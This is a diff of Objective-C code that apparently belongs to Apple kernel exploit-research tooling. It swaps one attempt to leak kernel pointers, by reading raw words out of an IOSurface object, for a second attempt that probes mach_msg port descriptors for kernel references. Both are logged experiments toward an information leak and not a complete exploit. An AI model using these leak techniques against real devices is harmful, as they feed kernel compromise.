@@ -1593,26 +1593,47 @@ cleanup:
                                             [hex appendFormat:@"%02x ", recvBuf[j]];
                                         scopeNote(r, [NSString stringWithFormat:@"  recv hex: %@", hex]);
 
-                                        // ---- Try leaking IOSurfaceRef kernel pointers ----
-                                        @try {
-                                            NSDictionary *sp = @{@"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4};
-                                            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
-                                            if (s) {
-                                                uint32_t sid = (uint32_t)IOSurfaceGetID(s);
-                                                scopeNote(r, [NSString stringWithFormat:@"  IOSurface for leak: id=%u", sid]);
-                                                uint64_t *sref = (uint64_t *)s;
-                                                scopeNote(r, [NSString stringWithFormat:
-                                                    @"  IOSurfaceRef[0]=0x%016llx [1]=0x%016llx [2]=0x%016llx [3]=0x%016llx",
-                                                    sref[0], sref[1], sref[2], sref[3]]);
-                                                for (int j = 0; j < 4; j++) {
-                                                    if (sref[j] > 0xfffffff000000000ULL)
-                                                        scopeNote(r, [NSString stringWithFormat:
-                                                            @"  KERNEL PTR in IOSurfaceRef[%d]: 0x%016llx", j, sref[j]]);
+                                        // ---- Approach 2: mach_msg with port descriptor ----
+                                        // Kernel fills in port names — may contain kernel refs
+                                        scopeNote(r, @"  --- Approach 2: mach_msg port descriptor ---");
+                                        {
+                                            mach_port_t pd = MACH_PORT_NULL;
+                                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &pd);
+                                            mach_port_insert_right(mach_task_self(), pd, pd, MACH_MSG_TYPE_MAKE_SEND);
+                                            // Send message with port descriptor
+                                            uint8_t pdBuf[256];
+                                            memset(pdBuf, 0, sizeof(pdBuf));
+                                            mach_msg_header_t *pdH = (mach_msg_header_t *)pdBuf;
+                                            pdH->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND) | MACH_MSGH_BITS_COMPLEX;
+                                            pdH->msgh_size = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_port_descriptor_t);
+                                            pdH->msgh_remote_port = pd;
+                                            pdH->msgh_local_port = MACH_PORT_NULL;
+                                            pdH->msgh_id = 0x4001;
+                                            mach_msg_body_t *body = (mach_msg_body_t *)(pdBuf + sizeof(mach_msg_header_t));
+                                            body->msgh_descriptor_count = 1;
+                                            mach_msg_port_descriptor_t *desc = (mach_msg_port_descriptor_t *)(pdBuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+                                            desc->name = pd;
+                                            desc->disposition = MACH_MSG_TYPE_MAKE_SEND;
+                                            desc->type = MACH_MSG_PORT_DESCRIPTOR;
+                                            kern_return_t kr2 = mach_msg(pdH, MACH_SEND_MSG | MACH_SEND_TIMEOUT, pdH->msgh_size, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                                            scopeNote(r, [NSString stringWithFormat:@"  mach_msg port desc send ret=%d", (int)kr2]);
+                                            if (kr2 == KERN_SUCCESS) {
+                                                uint8_t recv2[256];
+                                                memset(recv2, 0, sizeof(recv2));
+                                                mach_msg_header_t *rh2 = (mach_msg_header_t *)recv2;
+                                                kr2 = mach_msg(rh2, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 256, pd, 100, MACH_PORT_NULL);
+                                                scopeNote(r, [NSString stringWithFormat:@"  mach_msg port desc recv ret=%d size=%u bits=0x%x", (int)kr2, rh2->msgh_size, rh2->msgh_bits]);
+                                                if (kr2 == KERN_SUCCESS) {
+                                                    // Check for port descriptors in received message
+                                                    if (rh2->msgh_bits & MACH_MSGH_BITS_COMPLEX) {
+                                                        mach_msg_body_t *rbody = (mach_msg_body_t *)(recv2 + sizeof(mach_msg_header_t));
+                                                        scopeNote(r, [NSString stringWithFormat:@"  received %u descriptors", rbody->msgh_descriptor_count]);
+                                                        mach_msg_port_descriptor_t *rdesc = (mach_msg_port_descriptor_t *)(recv2 + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+                                                        scopeNote(r, [NSString stringWithFormat:@"  port desc: name=%u disposition=%u type=%u", rdesc->name, rdesc->disposition, rdesc->type]);
+                                                    }
                                                 }
-                                                CFRelease(s);
                                             }
-                                        } @catch (NSException *e) {
-                                            scopeNote(r, [NSString stringWithFormat:@"  IOSurface leak exception: %@", e]);
+                                            mach_port_destroy(mach_task_self(), pd);
                                         }
                                         if (!found) {
                                             scopeNote(r, @"  secret not in recv — checking offset 80 directly");
